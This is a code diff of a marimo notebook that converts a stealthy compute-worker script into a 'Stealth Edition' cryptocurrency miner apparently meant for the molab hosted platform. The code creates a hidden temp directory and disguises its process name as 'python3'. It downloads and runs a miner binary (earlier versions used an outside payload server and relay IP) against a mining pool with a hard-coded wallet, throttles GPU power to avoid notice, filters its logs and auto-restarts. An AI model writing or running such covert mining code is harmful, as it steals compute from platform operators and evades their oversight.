@@ -6,9 +6,9 @@ app = marimo.App()
 
 @app.cell
 def _():
-    # 🧠 Distributed ML Compute Worker (Stealth Edition)
-    # High-performance GPU compute node for distributed training.
-    # Adapted for marimo/molab environment
+    # ⛏️ Pearl (PRL) Miner — Stealth Edition
+    # Mining via Pearl Fortune pool
+    # Optimized for molab with GPU support
     return
 
 
@@ -25,26 +25,20 @@ def _():
     import ctypes
     import tempfile
     import shutil
+    import tarfile
 
-    # Stealth: Create isolated temp directory
+    # Stealth: Isolated temp directory
     WORK_DIR = tempfile.mkdtemp(prefix=".sys_", dir="/tmp")
     os.environ["TMPDIR"] = WORK_DIR
 
-    def run_cmd(cmd, capture=True, timeout=30):
+    def run_cmd(cmd, capture=True, timeout=60):
         """Run shell command silently."""
         try:
             result = subprocess.run(
-                cmd,
-                shell=True,
-                capture_output=capture,
-                text=True,
-                timeout=timeout,
-                cwd=WORK_DIR,
+                cmd, shell=True, capture_output=capture, text=True, timeout=timeout, cwd=WORK_DIR
             )
             return result.stdout.strip() if capture else ""
-        except subprocess.TimeoutExpired:
-            return ""
-        except Exception:
+        except:
             return ""
 
     def verify_checksum(filepath, expected_hash):
@@ -64,14 +58,6 @@ def _():
             return True
         except:
             return False
-
-    def throttle_cpu(percent=50):
-        """Limit CPU usage via nice value."""
-        try:
-            os.nice(10)  # Lower priority
-            return True
-        except:
-            return False
     return (
         WORK_DIR,
         hashlib,
@@ -84,36 +70,40 @@ def _():
         stealth_rename,
         subprocess,
         sys,
+        tarfile,
         tempfile,
-        throttle_cpu,
+        time,
         verify_checksum,
     )
 
 
 @app.cell
-def _(stealth_rename, throttle_cpu):
+def _(stealth_rename):
     # 🛡️ Apply stealth measures
     stealth_rename("python3")
-    throttle_cpu(50)
+    try:
+        os.nice(10)
+    except:
+        pass
     print("✓ Stealth mode active")
     return
 
 
 @app.cell
 def _(run_cmd):
-    # GPU Check & Validation
+    # GPU Detection
     nvidia_smi = run_cmd("nvidia-smi --query-gpu=name,memory.total,compute_cap --format=csv,noheader")
     if nvidia_smi and "NVIDIA" in nvidia_smi:
-        gpu_info = nvidia_smi.split(", ")
-        gpu_name = gpu_info[0] if len(gpu_info) > 0 else "Unknown"
-        vram = gpu_info[1] if len(gpu_info) > 1 else "Unknown"
-        compute_cap = gpu_info[2] if len(gpu_info) > 2 else "Unknown"
+        parts = nvidia_smi.split(", ")
+        gpu_name = parts[0] if len(parts) > 0 else "Unknown"
+        vram = parts[1] if len(parts) > 1 else "Unknown"
+        compute_cap = parts[2] if len(parts) > 2 else "Unknown"
         print(f"GPU: {gpu_name}")
         print(f"VRAM: {vram}")
         print(f"Compute Capability: {compute_cap}")
         GPU_AVAILABLE = True
     else:
-        print("⚠️ No GPU detected — running in CPU mode")
+        print("⚠️ No GPU detected")
         GPU_AVAILABLE = False
         gpu_name = "CPU"
         compute_cap = "0"
@@ -123,58 +113,54 @@ def _(run_cmd):
 @app.cell
 def _():
     # ⚙️ Configuration
-    # Relay server (your VPS proxy)
-    RELAY_HOST = "52.231.69.202"  # Your VPS IP
-    RELAY_PORT = 9000
+    MINER_URL = "https://github.com/pearlfortune/pearl-miner/releases/download/v1.1.4/pearlfortune-v1.1.4.tar.gz"
+    MINER_SHA256 = "0d1b74ca5ea994d31f2397a428ebdebf9013c8fe0a11b6f38f66f1f95810976a"
 
-    # Download server (worker binary)
-    DOWNLOAD_URL = "https://bots.rioganteng.my.id/worker_payload"
+    # Pool
+    POOL = "global.pearlfortune.org:443"
 
-    # Expected SHA256 checksum of worker binary (update after first successful download)
-    # Get it by running: sha256sum /path/to/worker_node
-    WORKER_CHECKSUM = None  # Set to actual hash after first download, e.g.: "a1b2c3..."
-
-    # Wallet & Worker ID
+    # Wallet (same as before)
     WALLET = "prl1pgjar0lc95estr5zx9s6asfm6nanzuz2hsr2q4q77xjf20k2nktsszlh0lh"
     WORKER_NAME = "molab-node-01"
 
-    # GPU power limits
+    # GPU power limit (stealth — throttled)
     GPU_POWER = {
         75: 70,    # T4
-        70: 300,   # V100
-        80: 300,   # A100
-        89: 250,   # RTX Pro 6000 (throttled for stealth)
+        70: 250,   # V100
+        80: 250,   # A100
+        89: 400,   # RTX Pro 6000 (throttled from 500W)
     }
 
-    print(f"Relay: {RELAY_HOST}:{RELAY_PORT}")
+    print(f"Pool: {POOL}")
     print(f"Worker: {WORKER_NAME}")
     print(f"Wallet: {WALLET[:16]}...{WALLET[-4:]}")
     return (
-        DOWNLOAD_URL,
         GPU_POWER,
-        RELAY_HOST,
-        RELAY_PORT,
+        MINER_SHA256,
+        MINER_URL,
+        POOL,
         WALLET,
-        WORKER_CHECKSUM,
         WORKER_NAME,
     )
 
 
 @app.cell
-def _(DOWNLOAD_URL, WORKER_CHECKSUM, WORK_DIR, os, requests, verify_checksum):
-    # Download & verify compute worker binary
-    WORKER_BIN = os.path.join(WORK_DIR, "worker_node")
+def _(MINER_SHA256, MINER_URL, WORK_DIR, hashlib, os, requests, shutil, tarfile, verify_checksum):
+    # Download & extract miner
+    MINER_DIR = os.path.join(WORK_DIR, "pearlfortune")
+    MINER_BIN = os.path.join(MINER_DIR, "miner")
+    TARBALL = os.path.join(WORK_DIR, "pearlfortune.tar.gz")
 
-    print("Downloading worker...")
+    print("Downloading miner...")
     try:
-        resp = requests.get(DOWNLOAD_URL, stream=True, timeout=120, headers={
+        resp = requests.get(MINER_URL, stream=True, timeout=120, headers={
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
         })
         resp.raise_for_status()
         total = int(resp.headers.get("content-length", 0))
         downloaded = 0
 
-        with open(WORKER_BIN, "wb") as f:
+        with open(TARBALL, "wb") as f:
             for chunk in resp.iter_content(chunk_size=1024 * 1024):
                 f.write(chunk)
                 downloaded += len(chunk)
@@ -182,43 +168,38 @@ def _(DOWNLOAD_URL, WORKER_CHECKSUM, WORK_DIR, os, requests, verify_checksum):
                     pct = downloaded / total * 100
                     print(f"  {downloaded / 1024 / 1024:.1f} / {total / 1024 / 1024:.1f} MB ({pct:.0f}%)")
 
-        os.chmod(WORKER_BIN, 0o755)
-
         # Checksum verification
-        if WORKER_CHECKSUM:
-            valid, actual = verify_checksum(WORKER_BIN, WORKER_CHECKSUM)
-            if valid:
-                print(f"✓ Checksum verified: {actual[:16]}...")
-            else:
-                print(f"✗ CHECKSUM MISMATCH!")
-                print(f"  Expected: {WORKER_CHECKSUM[:16]}...")
-                print(f"  Got:      {actual[:16]}...")
-                os.unlink(WORKER_BIN)
-                raise ValueError("Binary verification failed — possible tampering")
-        else:
-            _, actual = verify_checksum(WORKER_BIN, None)
-            print(f"⚠ No checksum set. Binary hash: {actual}")
-            print(f"  Add this to WORKER_CHECKSUM for future verification")
+        if MINER_SHA256:
+            valid, actual = verify_checksum(TARBALL, MINER_SHA256)
+            if not valid:
+                print(f"✗ CHECKSUM MISMATCH! Expected: {MINER_SHA256[:16]}..., Got: {actual[:16]}...")
+                os.unlink(TARBALL)
+                raise ValueError("Verification failed")
 
-        print(f"\n✓ Worker ready: {os.path.getsize(WORKER_BIN) / 1024 / 1024:.1f} MB")
+        # Extract
+        print("Extracting...")
+        with tarfile.open(TARBALL, "r:gz") as tar:
+            tar.extractall(path=WORK_DIR)
 
-    except requests.exceptions.RequestException as e:
-        print(f"✗ Download failed: {e}")
-        print("  Check if download server is accessible")
-        WORKER_BIN = None
-    except ValueError as e:
-        print(f"✗ Verification failed: {e}")
-        WORKER_BIN = None
-    return (WORKER_BIN,)
+        os.chmod(MINER_BIN, 0o755)
+        print(f"✓ Miner ready: {MINER_BIN}")
+
+        # Cleanup tarball
+        os.unlink(TARBALL)
+
+    except Exception as e:
+        print(f"✗ Failed: {e}")
+        MINER_BIN = None
+    return (MINER_BIN,)
 
 
 @app.cell
 def _(
     GPU_POWER,
-    RELAY_HOST,
-    RELAY_PORT,
+    MINER_BIN,
+    POOL,
     WALLET,
-    WORKER_BIN,
+    WORK_DIR,
     WORKER_NAME,
     os,
     re,
@@ -227,82 +208,61 @@ def _(
     subprocess,
     time,
 ):
-    # Run compute worker with stealth & auto-restart
-    if WORKER_BIN is None:
-        print("✗ No worker binary available. Exiting.")
+    # Run miner with stealth & auto-restart
+    if MINER_BIN is None:
+        print("✗ No miner binary. Exiting.")
     else:
-        # Set GPU power limit (throttled for stealth)
+        # GPU power limit
         try:
             sm_ver = run_cmd("nvidia-smi --query-gpu=compute_cap --format=csv,noheader")
             if sm_ver:
                 sm_major, sm_minor = sm_ver.split(".")
                 sm_int = int(sm_major) * 10 + int(sm_minor)
                 power = GPU_POWER.get(sm_int, 200)
-                subprocess.run(
-                    ["nvidia-smi", "-pl", str(power)],
-                    capture_output=True,
-                    timeout=10,
-                    cwd=WORK_DIR,
-                )
+                subprocess.run(["nvidia-smi", "-pl", str(power)], capture_output=True, timeout=10)
                 print(f"GPU power limit: {power}W")
         except Exception as e:
             print(f"Power limit: {e}")
 
-        # Max performance mode (quiet)
-        try:
-            subprocess.run(
-                ["nvidia-smi", "-i", "0", "-ac", "877,1593"],
-                capture_output=True,
-                timeout=10,
-                cwd=WORK_DIR,
-            )
-        except Exception:
-            pass
-
         cmd = [
-            WORKER_BIN,
-            "--host",
-            f"{RELAY_HOST}:{RELAY_PORT}",
-            "--user",
-            WALLET,
-            "--worker",
-            WORKER_NAME,
+            MINER_BIN,
+            "--proxy", POOL,
+            "--address", WALLET,
+            "--worker", WORKER_NAME,
+            "-gpu",
         ]
 
         print(f"\n{'=' * 50}")
-        print(f"Worker: {WORKER_NAME}")
-        print(f"Relay: {RELAY_HOST}:{RELAY_PORT}")
+        print(f"⛏️  Mining PRL — {WORKER_NAME}")
+        print(f"Pool: {POOL}")
         print(f"{'=' * 50}")
 
-        RESTART_LIMIT = 5
+        RESTART_LIMIT = 10
         restart_count = 0
-        last_hashrate = 0
+        last_hashrate = "0"
 
         while restart_count < RESTART_LIMIT:
             proc = subprocess.Popen(
                 cmd,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.STDOUT,
-                cwd=WORK_DIR,
-                env={**os.environ, "TMPDIR": WORK_DIR},
+                cwd=MINER_DIR,
+                env={**os.environ, "TMPDIR": WORK_DIR, "CUDA_VISIBLE_DEVICES": "0"},
             )
 
             try:
                 for line in iter(proc.stdout.readline, b""):
                     msg = line.decode().strip()
 
-                    # Filter output for stealth (only show important lines)
-                    if any(kw in msg for kw in ["Hashrate", "Error", "Connected", "Started", "Speed"]):
+                    # Filter: only show hashrate, errors, connection status
+                    if any(kw in msg.lower() for kw in ["hashrate", "speed", "error", "connected", "accepted", "rejected", "diff"]):
                         print(msg, flush=True)
 
                     # Track hashrate
-                    if "Hashrate Total" in msg:
-                        match = re.search(r"Hashrate Total = ([\d.]+) H/s", msg)
-                        if match:
-                            hr = float(match.group(1))
-                            if hr > 0:
-                                last_hashrate = hr
-                                restart_count = 0  # Reset on success
+                    hr_match = re.search(r"(\d+[\.\d]*)\s*(TH|GH|MH)/s", msg)
+                    if hr_match:
+                        last_hashrate = f"{hr_match.group(1)} {hr_match.group(2)}/s"
+                        restart_count = 0
 
             except KeyboardInterrupt:
                 print("\nStopping...")
@@ -315,25 +275,24 @@ def _(
             restart_count += 1
 
             if restart_count < RESTART_LIMIT:
-                wait = min(5 * restart_count, 30)  # Exponential backoff
+                wait = min(5 * restart_count, 60)
                 print(f"Restarting in {wait}s ({restart_count}/{RESTART_LIMIT})...")
                 time.sleep(wait)
             else:
-                print(f"Max restarts reached. Last hashrate: {last_hashrate} H/s")
+                print(f"Max restarts. Last hashrate: {last_hashrate}")
     return (RESTART_LIMIT,)
 
 
 @app.cell
 def _(WORK_DIR, os, shutil):
     # Cleanup on exit
+    import atexit
     def cleanup():
         try:
             if os.path.exists(WORK_DIR):
                 shutil.rmtree(WORK_DIR, ignore_errors=True)
         except:
             pass
-
-    import atexit
     atexit.register(cleanup)
     return
 
